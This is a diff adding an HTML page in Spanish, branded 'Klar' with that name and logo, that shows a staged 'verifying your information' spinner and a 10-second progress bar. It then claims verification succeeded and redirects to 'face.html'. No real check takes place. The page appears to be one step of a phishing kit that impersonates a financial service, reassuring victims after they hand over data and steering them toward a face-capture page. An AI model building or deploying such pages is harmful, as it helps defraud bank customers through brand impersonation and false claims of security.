@@ -1,0 +1,200 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Klar | Verificando…</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #f5f6f7;
+    --text: #111111;
+    --muted: #4a4f55;
+    --radius: 999px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: "Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Barra superior (igual que el index) */
+  header {
+    position: sticky; top: 0; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 84px;
+    padding: env(safe-area-inset-top, 0) 28px 0;
+    background: #1a1a1a;
+    color: #fff;
+  }
+  .logo { height: 60px; width: 60px; object-fit: cover; border-radius: 14px; display: block; }
+  .logo-text { font-size: 42px; font-weight: 500; letter-spacing: -1px; line-height: 1; display: none; }
+  .menu-btn {
+    width: 44px; height: 44px; border: 0; background: none;
+    display: grid; grid-template-columns: repeat(2, 11px); gap: 12px;
+    place-content: center;
+  }
+  .menu-btn span { width: 11px; height: 11px; background: #fff; border-radius: 50%; }
+
+  /* Contenedor principal */
+  .hero {
+    min-height: calc(100svh - 84px);
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    padding: 40px 28px calc(40px + env(safe-area-inset-bottom, 0));
+  }
+  .inner {
+    width: 100%; max-width: 480px; margin: 0 auto;
+    display: flex; flex-direction: column; align-items: center; text-align: center;
+  }
+
+  h1 {
+    font-size: clamp(26px, 7.5vw, 34px);
+    font-weight: 500; line-height: 1.15; letter-spacing: -.5px;
+    margin-bottom: 14px;
+  }
+  .sub {
+    font-size: clamp(16px, 4.5vw, 18px);
+    line-height: 1.4; color: var(--muted);
+    margin-bottom: 40px;
+  }
+
+  /* Spinner animado */
+  .spinner {
+    position: relative;
+    width: 96px; height: 96px;
+    margin-bottom: 36px;
+  }
+  .spinner::before,
+  .spinner::after {
+    content: "";
+    position: absolute; inset: 0;
+    border-radius: 50%;
+    border: 5px solid transparent;
+  }
+  .spinner::before {
+    border-top-color: #111;
+    border-right-color: #111;
+    animation: spin 1.1s linear infinite;
+  }
+  .spinner::after {
+    inset: 14px;
+    border-bottom-color: #111;
+    border-left-color: #111;
+    animation: spin 1.6s linear infinite reverse;
+    opacity: .55;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Barra de progreso */
+  .progress {
+    width: 100%; height: 6px;
+    background: #dfe2e5;
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 18px;
+  }
+  .progress-bar {
+    height: 100%; width: 0%;
+    background: #111;
+    border-radius: var(--radius);
+    transition: width 0.25s linear;
+  }
+
+  /* Contador */
+  .counter {
+    font-size: 15px;
+    font-weight: 500;
+    color: var(--muted);
+    letter-spacing: .3px;
+  }
+  .counter strong { color: #111; font-weight: 600; }
+
+  /* Mensaje final (solo visible al terminar) */
+  .done {
+    font-size: 16px;
+    font-weight: 500;
+    color: #1e8e3e;
+    margin-top: 10px;
+    min-height: 20px;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .spinner::before, .spinner::after { animation: none; }
+    .progress-bar { transition: none; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <a href="#" aria-label="Klar">
+    <img class="logo" id="logo" alt="Klar"
+         src="https://play-lh.googleusercontent.com/Euzej7ycTwY9s9N2bpfvmad3tm8SEFeqmadsa-bxsweGvvgsM0Sgapk4aXEO1SKrHOjMp4nsqJG-Zd8Db1rc6Q">
+    <span class="logo-text" id="logoText">Klar</span>
+  </a>
+  <span class="menu-btn" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
+</header>
+
+<main class="hero">
+  <div class="inner">
+    <div class="spinner" aria-hidden="true"></div>
+
+    <h1>Verificando tu información…</h1>
+    <p class="sub">Estamos validando tus datos de forma segura. Esto tomará solo unos segundos.</p>
+
+    <div class="progress" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" aria-label="Progreso de verificación">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <p class="counter">Espera <strong id="countdown">10</strong> segundos…</p>
+    <p class="done" id="doneMsg" role="status"></p>
+  </div>
+</main>
+
+<script>
+  // Logo fallback
+  const logo = document.getElementById('logo');
+  const logoText = document.getElementById('logoText');
+  logo.addEventListener('error', () => { logo.style.display = 'none'; logoText.style.display = 'block'; });
+
+  // Configuración de la espera
+  const DURACION = 10; // segundos
+  const DESTINO  = 'face.html';
+
+  const progressBar = document.getElementById('progressBar');
+  const progress    = document.querySelector('.progress');
+  const countdownEl = document.getElementById('countdown');
+  const doneMsg     = document.getElementById('doneMsg');
+
+  let restante = DURACION;
+
+  // Actualización inicial
+  countdownEl.textContent = restante;
+  progressBar.style.width = '0%';
+
+  // Intervalo de 1 segundo para el contador y progreso
+  const intervalo = setInterval(() => {
+    restante--;
+    const transcurrido = DURACION - restante;
+    const porcentaje = Math.min(100, (transcurrido / DURACION) * 100);
+
+    countdownEl.textContent = restante > 0 ? restante : 0;
+    progressBar.style.width = porcentaje + '%';
+    progress.setAttribute('aria-valuenow', Math.round(porcentaje));
+
+    if (restante <= 0) {
+      clearInterval(intervalo);
+      doneMsg.textContent = '✓ Verificación completada. Redirigiendo…';
+      // Pequeña pausa para que el usuario vea el 100%
+      setTimeout(() => { window.location.href = DESTINO; }, 400);
+    }
+  }, 1000);
+</script>
+</body>
+</html>
